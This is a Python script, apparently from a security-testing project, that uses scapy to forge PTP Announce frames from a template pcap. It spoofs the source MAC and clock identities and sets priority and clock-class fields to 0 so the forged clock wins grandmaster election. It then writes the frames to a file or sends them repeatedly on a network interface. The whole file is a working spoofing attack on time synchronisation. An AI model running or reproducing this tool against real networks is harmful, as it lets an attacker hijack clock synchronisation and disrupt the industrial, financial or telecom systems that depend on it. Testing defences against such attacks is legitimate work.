import argparse
import os
import sys
import time
from typing import Iterable

try:
    from scapy.all import Ether, PcapReader, Raw, sendp, wrpcap  # type: ignore
except ModuleNotFoundError as e:
    raise SystemExit(
        "Missing dependency: 'scapy'. Install it with `python -m pip install scapy` "
        "(or from `requirements.txt`)."
    ) from e


"""
This script is used to spoof an Announce packet from a pcap file.
It is used to test the Announce attack.
It takes as input a pcap file and an announce index.
It then spoofs the announce packet and sends it on the network.
It can also write the spoofed packet to a new pcap file.
"""

PTP_ETHERTYPE = 0x88F7
ANNOUNCE_MESSAGE_TYPE = 11


def get_clock_identity(mac_address: str, type_info: str) -> bytes:
    # Same logic as Scripts/Announce_Attack.py
    mac_address_str_no_colon = mac_address.replace(":", "")
    byte_string = bytes.fromhex(mac_address_str_no_colon)
    half_length = len(byte_string) // 2
    first_half = byte_string[:half_length]
    second_half = byte_string[half_length:]
    if type_info == "id":
        return first_half + b"\xff\xff" + second_half
    if type_info == "master":
        return first_half + b"\xff\xfe" + second_half
    raise ValueError(f"Unknown type_info={type_info!r}")


def iter_ptp_announce_frames(pcap_path: str) -> Iterable[tuple[int, "Packet", bytes, int, int]]:
    # yields: (pcap_index, pkt, payload, transportSpecific, messageType)
    with PcapReader(pcap_path) as pcap:
        for idx, pkt in enumerate(pcap):
            if Ether not in pkt:
                continue
            if pkt[Ether].type != PTP_ETHERTYPE:
                continue
            if not hasattr(pkt, "load"):
                continue
            payload = bytes(pkt.load)
            if not payload:
                continue
            first = payload[0]
            transport_specific = (first >> 4) & 0x0F
            message_type = first & 0x0F
            if message_type != ANNOUNCE_MESSAGE_TYPE:
                continue
            yield idx, pkt, payload, transport_specific, message_type


def ensure_pipeline_root_on_path() -> None:
    # Allows `from Scripts.* import ...` when running from anywhere.
    here = os.path.dirname(__file__)
    pipeline_test_attacker_root = os.path.abspath(os.path.join(here, ".."))
    if pipeline_test_attacker_root not in sys.path:
        sys.path.insert(0, pipeline_test_attacker_root)


def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Create a spoofed Announce frame using a template from a PCAP, then either send it "
            "on an interface or write it to a new PCAP."
        )
    )
    parser.add_argument(
        "pcap",
        nargs="?",
        default=os.path.join(os.path.dirname(__file__), "ptp_server.pcap"),
        help="Template PCAP path (default: ptp_server.pcap next to this script).",
    )
    parser.add_argument(
        "--announce-index",
        type=int,
        default=0,
        help="Which Announce frame to use (0-based among Announce frames only).",
    )
    parser.add_argument(
        "--src-mac",
        required=True,
        help=(
            "Spoofed source MAC address to write into Ether.src and to derive ClockIdentity "
            "(example: 02:11:22:33:44:55)."
        ),
    )
    parser.add_argument(
        "--dst-mac",
        default=None,
        help="Optional override for Ether.dst (default: keep from PCAP template).",
    )
    parser.add_argument(
        "--priority1",
        type=int,
        default=0,
        help="Value for priority1 (default: 0).",
    )
    parser.add_argument(
        "--priority2",
        type=int,
        default=0,
        help="Value for priority2 (default: 0).",
    )
    parser.add_argument(
        "--grandmaster-class",
        type=int,
        default=0,
        help="Value for grandmasterClockClass (default: 0).",
    )
    parser.add_argument(
        "--count",
        type=int,
        default=50,
        help="How many packets to send (default: 50).",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=0.125,
        help="Seconds between packets when sending (default: 0.125).",
    )
    parser.add_argument(
        "--iface",
        default=None,
        help="Interface to send on. If omitted, packets are not sent (only written if --out is set).",
    )
    parser.add_argument(
        "--out",
        default=None,
        help="Write spoofed packet(s) to this output PCAP instead of/in addition to sending.",
    )
    args = parser.parse_args()

    if not os.path.exists(args.pcap):
        print(f"PCAP not found: {args.pcap}", file=sys.stderr)
        return 2

    ensure_pipeline_root_on_path()
    from Scripts.AnnouncePTP import AnnouncePTP  # type: ignore

    announce_frames = list(iter_ptp_announce_frames(args.pcap))
    if not announce_frames:
        print("No Announce frames found in PCAP.", file=sys.stderr)
        return 3
    if args.announce_index < 0 or args.announce_index >= len(announce_frames):
        print(
            f"--announce-index out of range: {args.announce_index} (found {len(announce_frames)} Announce frames)",
            file=sys.stderr,
        )
        return 4

    pcap_idx, template_pkt, payload, transport_specific, _ = announce_frames[args.announce_index]
    print(f"Template pcap_packet_index: {pcap_idx}")
    print(f"Template Announce index: {args.announce_index}")
    print(f"Template payload_len: {len(payload)}")
    print(f"Template transportSpecific: {transport_specific}")
    print(f"Template Ether.src: {template_pkt[Ether].src}")
    print(f"Template Ether.dst: {template_pkt[Ether].dst}")

    spoof = AnnouncePTP(template_pkt)
    spoof.new_Ether_src(args.src_mac)
    if args.dst_mac:
        spoof.new_Ether_dst(args.dst_mac)

    clock_id = get_clock_identity(args.src_mac, "id")
    master_id = get_clock_identity(args.src_mac, "master")
    spoof.new_ClockIdentity(clock_id)
    spoof.new_grandmasterClockIdentity(master_id)
    spoof.new_priority1(int(args.priority1))
    spoof.new_priority2(int(args.priority2))
    spoof.new_grandmasterClockClass(int(args.grandmaster_class))

    # Ensure scapy treats it as raw payload when sending/writing
    spoof_packet = spoof.eth_layer / Raw(load=bytes(spoof.ptp_layer))

    if args.out:
        out_pkts = [spoof_packet] * max(1, int(args.count))
        wrpcap(args.out, out_pkts)
        print(f"Wrote {len(out_pkts)} packets to: {args.out}")

    if args.iface:
        print(f"Sending {args.count} packets on iface={args.iface} every {args.interval}s")
        for _ in range(int(args.count)):
            sendp(spoof_packet, iface=args.iface, verbose=False)
            time.sleep(float(args.interval))
        print("Done sending.")
    elif not args.out:
        print("Nothing to do: provide --iface to send and/or --out to write a pcap.")
        return 5

    return 0


if __name__ == "__main__":
    raise SystemExit(main())

